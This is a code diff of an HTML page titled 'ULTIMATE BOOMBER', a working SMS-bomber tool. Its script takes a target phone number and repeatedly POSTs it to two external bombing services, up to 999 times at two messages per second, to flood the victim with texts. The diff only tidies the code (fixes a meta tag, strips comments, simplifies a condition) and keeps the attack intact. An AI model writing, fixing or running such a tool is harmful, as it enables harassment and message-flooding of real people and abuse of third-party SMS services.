@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" own-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ULTIMATE BOOMBER</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
@@ -53,7 +53,6 @@
     <script>
         const ULTIMATE_PASS = "PROVIDER_1_KEY";
         let isAttacking = false;
-        let attackInterval;
 
         const attackBtn = document.getElementById('attackBtn');
         const stopBtn = document.getElementById('stopBtn');
@@ -71,7 +70,7 @@
         async function startAttack() {
             const number = document.getElementById('targetNumber').value;
             const amount = parseInt(document.getElementById('amount').value);
-            const isUnlimited = document.getElementById('unlimitedMode').classList.contains('hidden') ? false : true;
+            const isUnlimited = !document.getElementById('unlimitedMode').classList.contains('hidden');
 
             if(!number) return alert("Enter Number!");
 
@@ -81,17 +80,16 @@
             statusText.innerText = "Attacking...";
 
             let limit = isUnlimited ? 999 : amount;
-            let speed = isUnlimited ? 500 : 1000; // 500ms for 2 SMS per sec
+            let speed = isUnlimited ? 500 : 1000;
 
             for(let i=0; i < limit; i++) {
                 if(!isAttacking) break;
 
-                // API Calls
                 const apis = ['https://shadowx-sms-bomber.onrender.com/', 'https://nuke-sms-bomber.pages.dev/'];
                 apis.forEach(api => {
                     fetch(api, {
                         method: 'POST',
-                        mode: 'no-cors', // Important for cross-origin
+                        mode: 'no-cors',
                         body: JSON.stringify({ number: number, count: 1 }),
                         headers: { 'Content-Type': 'application/json' }
                     }).catch(err => console.log("API Error"));
@@ -112,7 +110,6 @@
 
         attackBtn.addEventListener('click', startAttack);
         stopBtn.addEventListener('click', stopAttack);
-
     </script>
 </body>
 </html>
